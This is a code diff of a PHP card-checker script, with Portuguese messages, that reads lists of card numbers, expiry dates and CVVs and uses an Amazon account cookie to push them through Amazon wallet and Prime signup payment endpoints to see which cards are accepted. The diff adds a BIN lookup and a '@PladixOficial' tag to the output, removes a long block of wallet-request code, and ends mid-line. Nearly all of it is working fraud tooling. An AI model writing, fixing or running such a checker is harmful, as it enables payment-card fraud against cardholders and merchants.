@@ -29,7 +29,7 @@ $lista = str_replace(array(" "), '/', $_GET['lista']);
   $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
 
   if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
-  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span><br>');
+  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@PladixOficial</span><br>');
   }
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
@@ -59,6 +59,33 @@ $cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
 $mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
 $ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
 $cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
+
+// --- Início da consulta de BIN segura ---
+$bin = substr($cc, 0, 6);
+$ch_bin = curl_init();
+curl_setopt($ch_bin, CURLOPT_URL, 'https://lookup.binlist.net/' . $bin);
+curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch_bin, CURLOPT_HTTPHEADER, array(
+    'Accept-Version: 3',
+    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+));
+$bin_result = curl_exec($ch_bin);
+curl_close($ch_bin);
+
+$infobin = '';
+if ($bin_result) {
+    $bin_data = json_decode($bin_result);
+    if (json_last_error() === JSON_ERROR_NONE && $bin_data && !isset($bin_data->error)) {
+        $scheme = isset($bin_data->scheme) ? strtoupper($bin_data->scheme) : 'N/A';
+        $type = isset($bin_data->type) ? strtoupper($bin_data->type) : 'N/A';
+        $brand = isset($bin_data->brand) ? $bin_data->brand : 'N/A';
+        $bank = isset($bin_data->bank->name) ? $bin_data->bank->name : 'N/A';
+        $country = isset($bin_data->country->name) ? $bin_data->country->name . ' ' . $bin_data->country->emoji : 'N/A';
+
+        $infobin = "-> $scheme/$type/$brand, $bank, $country";
+    }
+}
+// --- Fim da consulta de BIN segura ---
 
  $cookieprim = $_GET['cookie'];
 
@@ -141,7 +168,7 @@ curl_setopt_array($ch, [
   $r = curl_exec($ch);
 if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
 
     } else {
 
@@ -208,7 +235,7 @@ if (strpos($r, 'paymentInstrumentId')) {
 else{
 
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
 
 }
 
@@ -241,7 +268,7 @@ $addresid = getStr($r, 'AddressId":"','"');
 
 if(empty($addresid)) {
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Conta sem endereço, adicione um endereço na conta antes de fazer os testes. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Conta sem endereço, adicione um endereço na conta antes de fazer os testes. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
 
 }
 
@@ -261,164 +288,3 @@ CURLOPT_HTTPHEADER => array(
 'client: MYXSettings',
 'Content-Type: application/x-www-form-urlencoded',
 'Origin: https://www.amazon.com',
-'X-Requested-With: com.amazon.dee.app',
-'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
-'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-)
-
-]);
-$r = curl_exec($ch);
-curl_close($ch);
-
-
-
-$ch = curl_init(); 
-curl_setopt_array($ch, [
-CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
-CURLOPT_RETURNTRANSFER=>true,
-CURLOPT_SSL_VERIFYPEER=>false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_HTTPHEADER => array(
-'Host: www.amazon.com',
-'Upgrade-Insecure-Requests: 1',
-'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'X-Requested-With: com.amazon.mShop.android.shopping',
-'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
-)
-
-]);
-$r = curl_exec($ch);
-curl_close($ch);
-
-$market = getstr($r, "ue_mid = '","'");
-
-$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
-$customerId = getStr($r, 'customerId":"','"');
-$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
-$session_id   = getstr($r, '"sessionId":"', '"');
-$removdps   = getstr($r, '"testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"');
-
-
-
-$ch = curl_init(); 
-curl_setopt_array($ch, [
-CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
-CURLOPT_RETURNTRANSFER=>true,
-CURLOPT_SSL_VERIFYPEER=>false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
-CURLOPT_HTTPHEADER => array(
-'Host: www.amazon.com',
-'Accept: application/json, text/javascript, */*; q=0.01',
-'X-Requested-With: XMLHttpRequest',
-'Widget-Ajax-Attempt-Count: 0',
-'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
-'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
-'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-'Origin: https://www.amazon.com',
-'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
-'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
-
-)
-
-]);
-$r = curl_exec($ch);
-curl_close($ch);
-
-$payment = getStr($r, '"paymentMethodId\":\"','\"');
-
-$cookie2 = convertCookie($cookieprim, 'US');
-
-////////////////////////////////////////////////////////////
-
-
-$cookieUS1 = 'amazon.com';
-
-$ch = curl_init();
-curl_setopt_array($ch, [
-CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_SSL_VERIFYPEER => false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
-CURLOPT_HTTPHEADER     => array(
-"Host: $cookieUS1",
-"content-type: application/x-www-form-urlencoded",
-),
-]);
-
- $result = curl_exec($ch);
- curl_close($ch);
-
-$wid9090 = getstr($result, 'hidden" name="ppw-widgetState" value="','"');
-$sessionds = getstr($result, 'Subs:Prime","session":"','"');
- $customerID = getstr($result, 'customerId":"','"');
-$noovotoken = getstr($result, 'instrumentIds&quot;:[&quot;','&');
-$redirecturl = getstr($result, 'input type="hidden" name="redirectURL" value="','"/');
-$ohtoken1 = getstr($result, 'selectedInstrumentIds":["','"');
-$ohtoken2 = getstr($result, 'clientId":"Subs:Prime","serializedState":"','"');
-
-
-
-$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $brurloa92);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-$headers = array();
-$headers[] = 'Host: www.'.$cookieUS1.'';
-$headers[] = 'Cookie: '.$cookie2.'';
-$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
-$headers[] = 'Sec-Ch-Device-Memory: 8';
-$headers[] = 'Sec-Ch-Viewport-Width: 1360';
-$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
-$headers[] = 'X-Requested-With: XMLHttpRequest';
-$headers[] = 'Dpr: 1';
-$headers[] = 'Downlink: 10';
-$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
-$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
-$headers[] = 'Device-Memory: 8';
-$headers[] = 'Widget-Ajax-Attempt-Count: 0';
-$headers[] = 'Rtt: 150';
-$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
-$headers[] = 'Viewport-Width: 1360';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
-$headers[] = 'Sec-Ch-Dpr: 1';
-$headers[] = 'Ect: 4g';
-$headers[] = 'Origin: https://www.'.$cookieUS1.'';
-$headers[] = 'Sec-Fetch-Site: same-origin';
-$headers[] = 'Sec-Fetch-Mode: cors';
-$headers[] = 'Sec-Fetch-Dest: empty';
-$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
-$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-  $result = curl_exec($ch);
-  curl_close($ch);
-
-
-$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
-      $ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');
-
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
-curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePayment
